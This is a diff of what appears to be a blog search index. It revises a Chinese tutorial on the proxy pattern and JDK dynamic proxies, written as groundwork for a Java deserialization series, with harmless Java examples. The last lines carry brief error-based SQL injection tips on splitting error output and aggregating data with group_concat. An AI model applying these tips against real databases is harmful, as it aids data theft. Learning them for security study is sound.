@@ -1502,84 +1502,95 @@ ct&\equiv\,m^e\mod\,n,p^7|n\\
       </tags>
   </entry>
   <entry>
-    <title>JAVA反序列化03</title>
+    <title>JAVA反序列化03-动态代理</title>
     <url>/2023/01/08/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/index.html</url>
     <content><![CDATA[<!--toc-->
+
 <p>JDK 动态代理</p>
 <span id="more"></span>
-<h2 id="java-fan-xu-lie-hua-ji-chu-pian-zhi-jdk-dong-tai-dai-li"><a href="#Java-反序列化基础篇之-JDK-动态代理" class="headerlink" title="Java 反序列化基础篇之 JDK 动态代理"></a>Java 反序列化基础篇之 JDK 动态代理<a href="#java-fan-xu-lie-hua-ji-chu-pian-zhi-jdk-dong-tai-dai-li" class="header-anchor">#</a></h2><h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><p>Java 的动态代理在实践中有着广泛的使用场景，比如 Spring AOP、Java 注解的获取、日志、用户鉴权等。</p>
+
+<h2 id="java-fan-xu-lie-hua-ji-chu-pian-zhi-jdk-dong-tai-dai-li"><a href="#Java-反序列化基础篇之-JDK-动态代理" class="headerlink" title="Java 反序列化基础篇之 JDK 动态代理"></a>Java 反序列化基础篇之 JDK 动态代理<a href="#java-fan-xu-lie-hua-ji-chu-pian-zhi-jdk-dong-tai-dai-li" class="header-anchor">#</a></h2><h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><p>Java 的动态代理在实践中有着广泛的使用场景，比如 Spring AOP、Java 注解的获取、日志、用户鉴权等。由于 Java 动态代理与 Java 反射机制关系紧密，故在学习动态代理前需要了解 Java 反射机制。</p>
 <h3 id="dai-li-mo-shi"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式<a href="#dai-li-mo-shi" class="header-anchor">#</a></h3><p>无论学习静态代理还是动态代理，我们都要先了解一下代理模式。</p>
 <p>先看百度百科的定义</p>
-<p><code>代理模式的定义：为其他对象提供一种代理以控制这个对象的访问。在某些情况下，一个对象不适合或者不能直接引用另一个对象，而代理对象可以在客户端和目标对象之间起到中介的作用。</code></p>
+<p><code>代理模式的定义：给某个对象提供一种代理以控制这个对象的访问。在某些情况下，一个对象不适合或者不能直接引用另一个对象，而代理对象可以在客户端和被代理对象（目标对象）之间起到中介的作用。</code></p>
 <p>直接看定义可能有些难以理解，我们就以生活中具体的实例来说明一下。</p>
 <p>我们都去过超市购买过物品，超市从厂商那里购买货物之后出售给我们，我们通常并不知道货物从哪里经过多少流程才到超市。</p>
-<p>在这个过程中，等于是厂商委托超市出售货物，对我们来说厂商（真实对象）是不可见的。而超市（代理对象）呢，作为厂商的 “代理者” 来与我们进行交互。</p>
+<p>在这个过程中，等于是厂商委托超市出售货物，对我们来说厂商（真实对象）是不可见的。而超市（代理对象）作为厂商的 “代理者” 来与我们进行交互。</p>
 <p>同时，超市还可以根据具体的销售情况来进行折扣等处理，来丰富被代理对象的功能。</p>
 <p>通过代理模式，我们可以做到两点：</p>
 <ol>
-<li>隐藏委托类的具体实现。</li>
-<li>实现客户与委托类的解耦，在不改变委托类代码的情况下添加一些额外的功能（日志、权限）等。</li>
+<li>隐藏被代理类（委托类）的具体实现。</li>
+<li>实现客户与被代理类（委托类）的解耦，在不改变被代理类代码的情况下添加一些额外的功能（日志、权限）等。</li>
 </ol>
-<h3 id="dai-li-mo-shi-jiao-se-ding-yi"><a href="#代理模式角色定义" class="headerlink" title="代理模式角色定义"></a>代理模式角色定义<a href="#dai-li-mo-shi-jiao-se-ding-yi" class="header-anchor">#</a></h3><p>在上述的过程中我们可以定义三类对象：</p>
+<h3 id="dai-li-mo-shi-jiao-se-ding-yi"><a href="#代理模式角色定义" class="headerlink" title="代理模式角色定义"></a>代理模式角色定义<a href="#dai-li-mo-shi-jiao-se-ding-yi" class="header-anchor">#</a></h3><p>代理模式角色分为 3 种：</p>
 <ol>
-<li>Subject（抽象主题角色）：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法，比如广告、出售等。</li>
-<li>RealSubject（真实主题角色-<code>实体类</code>）：真正实现业务逻辑的类。比如实现了广告、出售等方法的厂家（Vendor）</li>
-<li>Proxy（代理主题角色-<code>代理类</code>）：用来代理和封装真实主题。比如，同样实现了广告、出售等方法的超市（Shop）</li>
+<li><code>Subject（抽象主题角色）</code>：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法，比如广告、出售等。</li>
+<li><code>RealSubject（真实主题角色）</code>：真正实现业务逻辑的类。比如实现了广告、出售等方法的厂家（Vendor）</li>
+<li><code>Proxy（代理主题角色）</code>：用来代理和封装真实主题。比如，同样实现了广告、出售等方法的超市（Shop）</li>
 </ol>
-<p><img src="/images/JAVA反序列化03/image-20230112095306189.png" alt="image-20230112095306189"></p>
-<h3 id="jing-tai-dai-li-shi-li"><a href="#静态代理实例" class="headerlink" title="静态代理实例"></a>静态代理实例<a href="#jing-tai-dai-li-shi-li" class="header-anchor">#</a></h3><p>静态代理是指代理类在程序运行前就已经存在，这种情况下的代理类通常都是我们在 Java 代码中定义的。</p>
+<p>代理模式的结构比较简单，其核心是代理类，为了让客户端能够一致性地对待真实对象和代理对象，在代理模式中引入了抽象层。</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112095306189.png" alt="image-20230112095306189"></p>
+<h3 id="jing-tai-dai-li-shi-li"><a href="#静态代理实例" class="headerlink" title="静态代理实例"></a>静态代理实例<a href="#jing-tai-dai-li-shi-li" class="header-anchor">#</a></h3><p>静态代理是指<code>代理类</code>在程序运行前就已经存在，这种情况下的代理类通常都是我们在 Java 代码中定义的。</p>
 <p>下面我们就以具体的实例来演示一下静态代理。</p>
-<p>首先定义一组接口 Sell，用来提供广告和销售等功能。然后提供 Vendor 类（厂商，被代理对象）和 Shop（超市，代理类），它们分别实现了 Sell 接口。</p>
+<p>首先定义一组接口 Sell，用来提供广告和销售等功能。然后提供 Vendor 类（厂商，被代理类）和 Shop（超市，代理类），它们分别实现了 Sell 接口。</p>
 <p>Sell 接口定义如下：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sell</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sell</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">ad</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>Vendor 类定义如下：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vendor</span> <span class="keyword">implements</span> <span class="title class_">Sell</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sell</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;shop sell goods&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ad</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Shop advert goods&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>Shop 类定义如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shop</span> <span class="keyword">implements</span> <span class="title class_">Sell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Sell sell;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shop</span><span class="params">(Sell sell)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.sell = sell;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sell</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理类Shop，处理sell&quot;</span>);</span><br><span class="line">        sell.sell();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ad</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理类Shop，处理ad&quot;</span>);</span><br><span class="line">        sell.ad();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shop</span> <span class="keyword">implements</span> <span class="title class_">Sell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Sell sell; <span class="comment">// 被代理的对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shop</span><span class="params">(Sell sell)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.sell = sell;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sell</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理类Shop，处理sell&quot;</span>);</span><br><span class="line">        sell.sell();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ad</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理类Shop，处理ad&quot;</span>);</span><br><span class="line">        sell.ad();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>其中代理类 Shop 通过聚合的方式持有了被代理类 Vendor 的引用，并在对应的方法中调用 Vendor 对应的方法。在 Shop 类中我们可以新增一些额外的处理，比如筛选购买用户、记录日志等操作。</p>
 <p>下面看看在客户端中如何使用代理类。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticProxy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Vendor</span> <span class="variable">vendor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vendor</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Sell</span> <span class="variable">sell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shop</span>(vendor);</span><br><span class="line">        sell.ad();</span><br><span class="line">        sell.sell();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticProxy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Vendor</span> <span class="variable">vendor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vendor</span>();</span><br><span class="line">        <span class="comment">// 虽然 Shop 的构造函数接收的是 Sell，但是实际传入的是 Vendor </span></span><br><span class="line">        <span class="type">Sell</span> <span class="variable">sell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shop</span>(vendor);</span><br><span class="line">        sell.ad();</span><br><span class="line">        sell.sell();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <h3 id="jing-tai-dai-li-de-you-dian"><a href="#静态代理的优点" class="headerlink" title="静态代理的优点"></a>静态代理的优点<a href="#jing-tai-dai-li-de-you-dian" class="header-anchor">#</a></h3><ul>
 <li>可以使得我们的真实角色更加纯粹，不再去关注一些公共的事情。</li>
 <li>公共业务由代理来完成，实现了业务的分工。</li>
 <li>公共业务发生扩展时变得更加集中和方便。</li>
 </ul>
 <h3 id="jing-tai-dai-li-de-que-dian"><a href="#静态代理的缺点" class="headerlink" title="静态代理的缺点"></a>静态代理的缺点<a href="#jing-tai-dai-li-de-que-dian" class="header-anchor">#</a></h3><p>静态代理实现简单且不入侵源代码，但当场景复杂时，静态代理会有以下缺点：</p>
-<ul>
-<li><p>当需要代理多个类时，代理对象要实现与目标对象一致的接口。要么，只维护一个代理类来实现多个接口，但这样会导致代理类过于庞大。要么，新建多个代理类；但这样会产生过多的代理类。</p>
-</li>
-<li><p>当接口需要增加、删除、修改方法时，目标对象与代理类都要同时修改，不易维护。</p>
-</li>
+<ol>
+<li>当需要代理多个类的时候，由于代理对象要实现与被代理对象（目标对象）一致的接口，有两种方式：<ul>
+<li>只维护一个代理类，由这个代理类实现多个接口，但是这样就会导致代理类过于庞大</li>
+<li>新建多个代理类，每个被代理类（目标对象）对应一个代理类，但是这样会产生过多的代理类</li>
 </ul>
-<p>我们想要静态代理的好处，又不想要静态代理的缺点，所有就有了动态代理！</p>
+</li>
+<li>当接口需要增加、删除、修改方法的时候，（被代理类）目标对象与代理类都要同时修改，<code>不易维护</code>。</li>
+</ol>
+<p>如果我们想要静态代理的优点而又不想要其缺点，那么就需要使用动态代理！</p>
 <h3 id="dong-tai-dai-li"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理<a href="#dong-tai-dai-li" class="header-anchor">#</a></h3><p>动态代理是指代理类在程序运行时进行创建的代理方式。这种情况下，代理类并不是在 Java 代码中定义的，而是在运行时根据 Java 代码中的指示动态生成的。</p>
 <p>相比于静态代理，动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类的函数。</p>
 <h3 id="ji-yu-jdk-yuan-sheng-dong-tai-dai-li-shi-xian"><a href="#基于-JDK-原生动态代理实现" class="headerlink" title="基于 JDK 原生动态代理实现"></a>基于 JDK 原生动态代理实现<a href="#ji-yu-jdk-yuan-sheng-dong-tai-dai-li-shi-xian" class="header-anchor">#</a></h3><p>实现动态代理通常有两种方式: JDK 原生动态代理和 CGLIB 动态代理。这里，我们以 JDK 原生动态代理为例来进行讲解。</p>
 <h4 id="java-dong-tai-dai-li-xu-yao-liao-jie-de-liang-ge-lei"><a href="#Java-动态代理需要了解的两个类" class="headerlink" title="Java 动态代理需要了解的两个类"></a>Java 动态代理需要了解的两个类<a href="#java-dong-tai-dai-li-xu-yao-liao-jie-de-liang-ge-lei" class="header-anchor">#</a></h4><p>JDK 动态代理主要涉及两个类：</p>
 <p><code>java.lang.reflect.Proxy</code> 和 <code>java.lang.reflect.InvocationHandler</code>。</p>
-<h5 id="invocationhandler-diao-yong-chu-li-cheng-xu"><a href="#InvocationHandler：调用处理程序" class="headerlink" title="InvocationHandler：调用处理程序"></a>InvocationHandler：调用处理程序<a href="#invocationhandler-diao-yong-chu-li-cheng-xu" class="header-anchor">#</a></h5><p><code>InvocationHandler</code> 是由一个代理实例的 invocation handler 所实现的接口。</p>
+<h5 id="invocationhandler-diao-yong-chu-li-qi"><a href="#InvocationHandler：调用处理器" class="headerlink" title="InvocationHandler：调用处理器"></a>InvocationHandler：调用处理器<a href="#invocationhandler-diao-yong-chu-li-qi" class="header-anchor">#</a></h5><p><code>InvocationHandler</code> 是由一个代理实例的 invocation handler 所实现的接口。</p>
 <p>每个代理实例都有一个相关联的 invocation handler。当在代理实例上调用方法时，方法调用被编码并被传送到其 invocation handler 的 invoke 方法上。</p>
-<p><img src="/images/JAVA反序列化03/image-20230112151730536.png" alt="image-20230112151730536"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112151730536.png" alt="image-20230112151730536"></p>
 <p><code>InvocationHandler</code> 接口定义了如下方法：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>InvocationHandler 接口 的 invoke 方法会在代理实例上处理方法调用并返回结果。当在某个代理实例上调用一个方法时，该方法将会在这个代理实例相关联的 invocation handler 上被调用。</p>
-<p><img src="/images/JAVA反序列化03/image-20230112152657594.png" alt="image-20230112152657594"></p>
+
+<p>InvocationHandler 接口 的 <code>invoke</code> 方法会在代理实例上处理方法调用并返回结果。</p>
+<p>当我们在一个代理实例上调用某个方法时，和此代理实例相关联的 invocation handler 会调用 <code>invoke</code> 方法</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112152657594.png" alt="image-20230112152657594"></p>
 <p>参数：</p>
 <ul>
 <li><code>proxy</code> - 调用该方法的代理实例</li>
 </ul>
-<p><img src="/images/JAVA反序列化03/image-20230112152803095.png" alt="image-20230112152803095"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112152803095.png" alt="image-20230112152803095"></p>
 <ul>
 <li><code>method</code> - 对应代理实例上（被）调用的接口方法的 Method 类的实例对象</li>
 </ul>
-<p><img src="/images/JAVA反序列化03/image-20230112153141864.png" alt="image-20230112153141864"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112153141864.png" alt="image-20230112153141864"></p>
 <ul>
 <li><code>args</code> - 传给上述方法的参数</li>
 </ul>
-<p><img src="/images/JAVA反序列化03/image-20230112153308828.png" alt="image-20230112153308828"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112153308828.png" alt="image-20230112153308828"></p>
 <ul>
 <li><p>返回值</p>
-<p><img src="/images/JAVA反序列化03/image-20230112153329353.png" alt="image-20230112153329353"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112153329353.png" alt="image-20230112153329353"></p>
 </li>
 </ul>
 <p>顾名思义，实现了该接口的中介类叫做 “调用处理器”。</p>
@@ -1587,16 +1598,19 @@ ct&\equiv\,m^e\mod\,n,p^7|n\\
 <p>对 “真实主题角色” 中的所有方法的调用都会变为对 <code>invoke</code> 的调用，可以在 invoke 方法中添加统一的处理逻辑（也可以根据 method 参数对不同的代理类方法做不同的处理）。</p>
 <p>note：关于为什么会自动调用 invoke 函数，我目前还不知道。</p>
 <h5 id="proxy-dai-li"><a href="#Proxy-代理" class="headerlink" title="Proxy : 代理"></a>Proxy : 代理<a href="#proxy-dai-li" class="header-anchor">#</a></h5><p>Proxy 类用于获取指定代理对象所关联的调用处理器。</p>
-<p><img src="/images/JAVA反序列化03/image-20230112153928281.png" alt="image-20230112153928281"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/image-20230112153928281.png" alt="image-20230112153928281"></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br></pre></td></tr></table></figure>
+
 <p><code>Proxy</code> 提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。这个类提供的 <code>newProxyInstance</code> 方法会返回给定接口的代理类的实例</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, 类&lt;?&gt;[] interfaces, InvocationHandler h)</span> <span class="keyword">throws</span> IllegalArgumentException</span><br></pre></td></tr></table></figure>
+
 <p>参数：</p>
 <ul>
-<li><code>loader</code> 定义代理类的类加载器（这里代理的是接口，所以实际上定义的是接口的加载器）</li>
+<li><p><code>loader</code> 定义代理类的类加载器（这里代理的是接口，所以实际上定义的是接口的加载器）</p>
+</li>
 <li><p><code>interfaces</code> 要实现的代理类的接口的列表</p>
 </li>
-<li><p><code>h</code> 具有指定调用处理程序的代理实例 <em> 代理类由指定的类加载器定义 </em> 并实现指定的接口</p>
+<li><p><code>h</code> 具有指定调用处理程序的代理实例 * 代理类由指定的类加载器定义 * 并实现指定的接口</p>
 </li>
 </ul>
 <h4 id="dong-tai-dai-li-de-dai-ma-shi-xian"><a href="#动态代理的代码实现" class="headerlink" title="动态代理的代码实现"></a>动态代理的代码实现<a href="#dong-tai-dai-li-de-dai-ma-shi-xian" class="header-anchor">#</a></h4><p>要编写动态代理的代码，需要抓牢两个要点</p>
@@ -1607,17 +1621,21 @@ ct&\equiv\,m^e\mod\,n,p^7|n\\
 <p>首先是我们的接口类</p>
 <p><code>UserService.java</code></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>接着，我们需要用实体类去实现这个抽象类</p>
 <p><code>UserServiceImpl.java</code></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;增加了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>接着，是动态代理的实现类</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 被代理的接口  </span></span><br><span class="line"> <span class="keyword">private</span> UserService userService;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(UserService userService)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.userService = userService;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 动态生成代理类实例  </span></span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), userService.getClass().getInterfaces(), <span class="built_in">this</span>);  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 处理代理类实例，并返回结果  </span></span><br><span class="line"> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">        log(method);  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(userService, args);  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//业务自定义需求  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Method method)</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[Info] &quot;</span> + method.getName() + <span class="string">&quot;方法被调用&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>最后编写我们的 Client，也就是启动器</li>
 </ul>
 <p><code>Client.java</code></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> src.JdkProxy.DynamicProxy.UserServiceImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// 真实角色  </span></span><br><span class="line"> <span class="type">UserServiceImpl</span> <span class="variable">userServiceImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();  </span><br><span class="line"> <span class="comment">// 代理角色，不存在  </span></span><br><span class="line"> <span class="type">UserProxyInvocationHandler</span> <span class="variable">userProxyInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProxyInvocationHandler</span>();  </span><br><span class="line"> userProxyInvocationHandler.setUserService((UserService) userServiceImpl); <span class="comment">// 设置要代理的对象  </span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 动态生成代理类  </span></span><br><span class="line"> <span class="type">UserService</span> <span class="variable">proxy</span> <span class="operator">=</span> (UserService) userProxyInvocationHandler.getProxy();  </span><br><span class="line">  </span><br><span class="line"> proxy.add();  </span><br><span class="line"> proxy.delete();  </span><br><span class="line"> proxy.update();  </span><br><span class="line"> proxy.query();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/JAVA反序列化03/DynamicProxySuccess.png" alt="img"></p>
+
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9603/DynamicProxySuccess.png" alt="img"></p>
 <h4 id="dong-tai-dai-li-chuang-jian-bu-zou"><a href="#动态代理创建步骤" class="headerlink" title="动态代理创建步骤"></a>动态代理创建步骤<a href="#dong-tai-dai-li-chuang-jian-bu-zou" class="header-anchor">#</a></h4><p>在运行期间动态创建一个 <code>interface</code> 实例的方法如下：</p>
 <ol>
 <li>定义一个 <code>InvocationHandler</code> 实例，它负责实现接口的方法调用；</li>
@@ -2262,7 +2280,7 @@ ct&\equiv\,m^e\mod\,n,p^7|n\\
 <li>报错函数通常对报错输出的长度有限制，面对这种情况可以进行分割输出。</li>
 <li>可以使用 group_concat 等函数聚合数据</li>
 </ul>
